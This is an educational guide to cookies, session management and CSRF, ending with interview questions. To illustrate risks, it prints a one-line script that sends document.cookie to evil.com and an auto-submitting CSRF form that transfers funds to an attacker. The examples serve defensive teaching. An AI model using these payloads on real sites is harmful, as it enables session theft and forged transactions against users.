# Sessions and Cookies

Sessions and cookies are the foundation of stateful web authentication. Understanding how they work and how to secure them is essential for backend security.

## Cookies

A **cookie** is a small piece of data that the server sends to the browser. The browser stores it and includes it in subsequent requests to the same domain.

Cookies are set by the server using the `Set-Cookie` header:

```http
Set-Cookie: session_id=abc123; Path=/; HttpOnly; Secure; SameSite=Lax
```

Key attributes:

- **Name** -- the cookie identifier
- **Value** -- the data stored
- **Path** -- restricts the cookie to a URL path
- **Domain** -- restricts the cookie to a domain
- **Max-Age / Expires** -- controls how long the cookie lasts
- **HttpOnly** -- prevents JavaScript access
- **Secure** -- restricts to HTTPS
- **SameSite** -- controls cross-site behavior

## HttpOnly

The **`HttpOnly`** attribute prevents JavaScript from accessing the cookie via `document.cookie`.

- Protects session tokens from XSS attacks
- The cookie is still sent with every request to the matching domain
- Should be set on all authentication cookies

```http
Set-Cookie: session_id=abc123; HttpOnly
```

Without `HttpOnly`, injected JavaScript can steal the session token:

```javascript
// Attacker script
fetch("https://evil.com/steal?cookie=" + document.cookie)
```

## Secure

The **`Secure`** attribute ensures the cookie is only sent over HTTPS connections.

- Prevents the cookie from being sent over unencrypted HTTP
- Should always be set on authentication cookies
- In development, can be omitted for `localhost`

```http
Set-Cookie: session_id=abc123; Secure
```

## SameSite

The **`SameSite`** attribute controls whether the cookie is sent with cross-site requests. This is a primary defense against CSRF.

Three values:

- **`Strict`** -- cookie is never sent with cross-site requests
- **`Lax`** -- cookie is sent with top-level navigations (GET requests from other sites), but not with cross-site form submissions or AJAX
- **`None`** -- cookie is sent with all requests (requires `Secure`)

```http
Set-Cookie: session_id=abc123; SameSite=Lax
```

| Value | Cross-site GET | Cross-site POST | Cross-site iframe |
|---|---|---|---|
| Strict | No | No | No |
| Lax | Yes (top-level) | No | No |
| None | Yes | Yes | Yes |

## Session IDs

A **session ID** is a unique, random identifier stored in a cookie and mapped to server-side session data.

- The session ID itself should be a high-entropy, cryptographically random string
- Session data is stored server-side (memory, Redis, database)
- The session ID is meaningless without the server-side data
- Old or inactive sessions should expire automatically

Best practices:

- Regenerate the session ID after login to prevent session fixation
- Store sessions in a secure, fast store (Redis, database)
- Set reasonable expiration times
- Invalidate sessions on logout

## CSRF (Cross-Site Request Forgery)

**CSRF** attacks trick a logged-in user's browser into making unintended requests to a site where the user is authenticated.

Attack flow:

1. User logs into `bank.com` and receives a session cookie.
2. User visits a malicious site that contains:
   ```html
   <form action="https://bank.com/transfer" method="POST">
     <input name="to" value="attacker" />
     <input name="amount" value="10000" />
   </form>
   <script>document.forms[0].submit()</script>
   ```
3. The browser automatically sends the `bank.com` cookie with the request.
4. The transfer executes as the authenticated user.

Defense mechanisms:

- **SameSite cookies** -- the primary modern defense
- **CSRF tokens** -- a unique, unpredictable token included in forms and validated server-side
- **Checking `Origin` / `Referer` headers** -- verify the request came from your own site
- **Double-submit cookie pattern** -- cookie value must match a form or header value
- **Requiring re-authentication** for sensitive actions (password change, fund transfer)

## Mid/Senior Interview Questions and Answers

### 1. What is the difference between a cookie and a session?

**Answer:** A cookie is client-side storage that the browser sends with every
request. A session is server-side storage associated with a session ID. The
session ID is typically stored in a cookie.

Cookies can store any data (preferences, tracking). Sessions store
authentication state and user data on the server.

### 2. How does SameSite=Lax protect against CSRF?

**Answer:** SameSite=Lax prevents the cookie from being sent with cross-site
form submissions (POST, PUT, DELETE). It is only sent with top-level
navigations (clicking a link from another site).

This means a malicious site cannot trigger state-changing requests that carry
the session cookie, blocking the core mechanism of CSRF attacks.

### 3. What is session fixation and how do you prevent it?

**Answer:** Session fixation is an attack where the attacker sets a known
session ID before the user authenticates. After login, the attacker uses the
known session ID to hijack the session.

Prevent it by regenerating the session ID on every privilege change
(login, password change, role elevation) and never accepting session IDs from
URL parameters.

### 4. Should you store JWTs in cookies or localStorage?

**Answer:** HttpOnly, Secure, SameSite cookies are generally safer for web
applications because JavaScript cannot read them, reducing XSS token theft.

localStorage is easier for injected JavaScript to read and does not have
built-in expiration or SameSite protection. However, cookies require CSRF
protection. The right choice depends on the threat model, client type, and
authentication flow.

### 5. How do you handle session management at scale?

**Answer:** Use a fast, centralized session store like Redis or a distributed
cache. Set reasonable TTLs, support session invalidation, and implement
concurrent session limits.

For stateless architectures, prefer JWT-based authentication where the server
does not store session state. When sessions are required, use a shared store
accessible by all application instances.

### 6. What are the security considerations for cookie attributes?

**Answer:** Always set `HttpOnly` on authentication cookies to prevent XSS
access. Always set `Secure` to ensure HTTPS-only transmission. Set
`SameSite=Lax` (or `Strict` for high-security apps) to prevent CSRF.

Additionally, use short `Max-Age` values, restrict `Path` and `Domain` to the
minimum necessary, and consider prefixing cookie names with `__Host-` for
additional security guarantees.
